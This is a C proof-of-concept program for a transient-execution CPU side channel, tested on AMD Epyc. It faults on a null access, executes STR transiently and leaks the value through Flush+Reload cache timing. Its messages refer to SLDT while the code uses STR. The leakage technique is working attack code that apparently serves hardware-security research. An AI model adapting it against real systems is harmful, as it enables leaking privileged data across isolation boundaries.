#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//
// Code tested on: AMD Epyc 7252
//

#include "cacheutils.h"

#define PAGESIZE 4096
#define IMUL_BLOCK asm volatile ("imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" : : "c"(7331) : "memory");

__attribute__((aligned(PAGESIZE)))
char testarray[PAGESIZE * 256];

void init() {
  memset(testarray, 1, 256 * PAGESIZE);

  CACHE_MISS = detect_flush_reload_threshold() - 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);
  mfence();

  signal(SIGSEGV, trycatch_segfault_handler);
}

int main(int argc, char* argv[]) {
  init();

  size_t iterations = 5;
  size_t spacing = 4096;
  size_t tries = 500;

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();
  size_t zeroes_seen = 0;
  size_t nonzeroes_seen = 0;

  for (int shift = 0; shift < 64; shift++) {
    for (size_t try = 0; try < tries; try++) {
      for (size_t i = 0; i < iterations; i++) {
        if (!setjmp(trycatch_buf)) {
          // try to leak some byte
          asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
          IMUL_BLOCK
          maccess(0);  // start transient window

          asm volatile(
          INTELASM(
              "xor rax, rax\n\t"
              "add rax, 42\n\t"
              "mov ecx, %[shift]\n\t"
              "lea r11, [%[testarray]]\n\t"
              "str rax\n\t"
              "shr rax, cl\n\t"
              "and rax, 0xff\n\t"
              "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
              "add r11, rax\n\t"
              "mov rax, [r11]\n\t"
              "xor rax, rax\n\t"
          )
          : : [testarray]"r"(&testarray), [shift]"r"(shift): "memory", "rdx", "rcx", "rax", "r11");
          try_abort();
        }
        unblock_signal(SIGSEGV);
      }  // for (size_t try = 0; try < tries; try++)

      // check for hits in array
      int got_hit = 0;
      for (size_t i = 0; i < 255; i++) {
        size_t idx = ((i * 167u) + 13u) & 255u;
        size_t delta = flush_reload_t(testarray + idx * spacing);
        if (delta < CACHE_MISS) {
          //printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
          if (idx != 0) got_hit++;
          zeroes_seen += idx == 1 ? 1 : 0;
          nonzeroes_seen += idx != 1 ? 1 : 0;
        }
      }
    }  // for (size_t i = 0; i < iterations; i++)
  }
  printf("===================================\n");
  printf("If this PoC works you should see a few thousand zeroes seen and no non-zeroes\n");
  printf("===================================\n");
  printf("Zeroes seen: %zu\n", zeroes_seen);
  printf("Non-Zeroes seen: %zu\n", nonzeroes_seen);
  if (zeroes_seen > 1000 && nonzeroes_seen < 100) {
    printf("\033[92m[+] PoC works: We get the value 0 from transient reads on SLDT!\033[0m\n");
  } else {
    printf("\033[91m[!] PoC does not work on this system!\033[0m\n");
  }
  return 0;
}
